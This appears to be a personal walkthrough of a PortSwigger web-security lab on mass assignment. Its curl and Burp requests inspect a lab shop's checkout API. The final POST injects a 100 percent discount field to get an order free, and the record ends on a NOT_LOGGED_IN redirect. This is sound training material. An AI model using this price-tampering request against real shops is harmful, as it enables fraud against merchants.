[Lab](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)

---

When I go on `/api`, I can see some information on the api

![[Screenshot_2024-07-22_15-46-45.png]]

###### Request
Curl
```Shell
curl --cookie "session=6xXBXlv7kslQJYIY9rW5umxoP3Z4ACqv" -X GET 'https://0a40005e039d85e383191ef200a90051.web-security-academy.net/api/checkout'
```
Burp
```http
GET /api/checkout HTTP/2
Host: 0a40005e039d85e383191ef200a90051.web-security-academy.net
Cookie: session=6xXBXlv7kslQJYIY9rW5umxoP3Z4ACqv
```

###### Response
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 57

{"chosen_discount":{"percentage":0},"chosen_products":[]}
```

By doing action on the website, I was able to get a json with interresting values
###### Request
```http
GET /api/checkout HTTP/2
Host: 0a40005e039d85e383191ef200a90051.web-security-academy.net
Cookie: session=EY0GLmnIUQJiy1CQyIt7VJ2IDV47SMpN
```

###### Response
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 141

{
	"chosen_discount":{
		"percentage":0
	},"chosen_products":[
		{
			"product_id":"4",
			"name":"Beat the Vacation Traffic",
			"quantity":4,
			"item_price":2806
		}
	]
}
```

I could use the `POST` allowed method to set the discord percentage to 100 and get my order for free

###### Request
```http
POST /api/checkout HTTP/2
Host: 0a40005e039d85e383191ef200a90051.web-security-academy.net
Cookie: session=EY0GLmnIUQJiy1CQyIt7VJ2IDV47SMpN
Content-Type: application/json
Content-Length: 148

{"chosen_discount": {"percentage":100},"chosen_products":[{"product_id":"4","name":"Beat the Vacation Traffic","quantity":4,"item_price":2806}]}
```
###### Response
```http
HTTP/2 201 Created
Location: /cart?err=NOT_LOGGED_IN
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
